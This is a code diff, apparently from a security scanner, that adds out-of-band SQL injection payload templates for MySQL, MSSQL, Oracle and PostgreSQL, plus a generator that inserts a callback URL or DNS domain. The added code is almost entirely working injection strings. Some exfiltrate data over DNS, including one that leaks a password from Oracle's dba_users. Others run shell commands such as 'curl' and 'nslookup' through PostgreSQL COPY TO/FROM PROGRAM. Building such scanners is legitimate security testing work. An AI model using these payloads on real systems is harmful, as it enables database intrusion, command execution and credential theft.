@@ -190,3 +190,111 @@ SQL_ERROR_SIGNATURES = [
     "division by zero",
     "supplied argument is not a valid",
 ]
+
+
+# OAST (Out-of-Band Application Security Testing) SQL injection payload templates
+# These templates use {CALLBACK} placeholder for the callback URL/domain
+OAST_SQLI_TEMPLATES = [
+    # MySQL - DNS exfiltration via LOAD_FILE
+    {
+        "template": "' AND LOAD_FILE(CONCAT('\\\\\\\\','{DNS_CALLBACK}','\\\\a'))--",
+        "description": "MySQL LOAD_FILE DNS exfiltration",
+        "database": "mysql",
+    },
+    {
+        "template": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{DNS_CALLBACK}','\\\\a'))--",
+        "description": "MySQL UNION LOAD_FILE DNS",
+        "database": "mysql",
+    },
+
+    # MSSQL - xp_dirtree DNS callback
+    {
+        "template": "'; EXEC master..xp_dirtree '//{DNS_CALLBACK}/a'--",
+        "description": "MSSQL xp_dirtree DNS callback",
+        "database": "mssql",
+    },
+    {
+        "template": "'; EXEC master..xp_subdirs '//{DNS_CALLBACK}/a'--",
+        "description": "MSSQL xp_subdirs DNS callback",
+        "database": "mssql",
+    },
+    {
+        "template": "'; EXEC master..xp_fileexist '//{DNS_CALLBACK}/a'--",
+        "description": "MSSQL xp_fileexist DNS callback",
+        "database": "mssql",
+    },
+
+    # Oracle - UTL_HTTP callback
+    {
+        "template": "' UNION SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM DUAL--",
+        "description": "Oracle UTL_HTTP callback",
+        "database": "oracle",
+    },
+    {
+        "template": "' AND (SELECT UTL_HTTP.REQUEST('{CALLBACK}') FROM DUAL) IS NOT NULL--",
+        "description": "Oracle UTL_HTTP in condition",
+        "database": "oracle",
+    },
+    {
+        "template": "' AND DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE ROWNUM=1)||'.{DNS_CALLBACK}',80) IS NOT NULL--",
+        "description": "Oracle DBMS_LDAP DNS callback",
+        "database": "oracle",
+    },
+
+    # PostgreSQL - COPY TO PROGRAM
+    {
+        "template": "'; COPY (SELECT '') TO PROGRAM 'curl {CALLBACK}'--",
+        "description": "PostgreSQL COPY TO PROGRAM curl callback",
+        "database": "postgresql",
+    },
+    {
+        "template": "'; COPY (SELECT '') TO PROGRAM 'nslookup {DNS_CALLBACK}'--",
+        "description": "PostgreSQL COPY TO PROGRAM DNS callback",
+        "database": "postgresql",
+    },
+    {
+        "template": "'; CREATE TABLE IF NOT EXISTS oast(data text); COPY oast FROM PROGRAM 'curl {CALLBACK}'--",
+        "description": "PostgreSQL COPY FROM PROGRAM callback",
+        "database": "postgresql",
+    },
+
+    # MySQL - INTO OUTFILE to UNC path
+    {
+        "template": "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{DNS_CALLBACK}\\\\a'--",
+        "description": "MySQL INTO OUTFILE UNC callback",
+        "database": "mysql",
+    },
+]
+
+
+def generate_oast_sqli_payloads(callback_url: str, dns_callback: str, database: str = None) -> list:
+    """
+    Generate SQL injection payloads with actual OAST callback URLs.
+
+    Args:
+        callback_url: HTTP callback URL from OAST client
+        dns_callback: DNS callback domain from OAST client
+        database: Optional database type filter (mysql, mssql, oracle, postgresql)
+
+    Returns:
+        List of payload strings ready for injection
+    """
+    payloads = []
+
+    for template in OAST_SQLI_TEMPLATES:
+        # Filter by database type if specified
+        if database and template["database"] != database.lower():
+            continue
+
+        payload_str = template["template"]
+        payload_str = payload_str.replace("{CALLBACK}", callback_url)
+        payload_str = payload_str.replace("{DNS_CALLBACK}", dns_callback)
+
+        payloads.append({
+            "payload": payload_str,
+            "description": template["description"],
+            "database": template["database"],
+            "is_oast": True,
+        })
+
+    return payloads
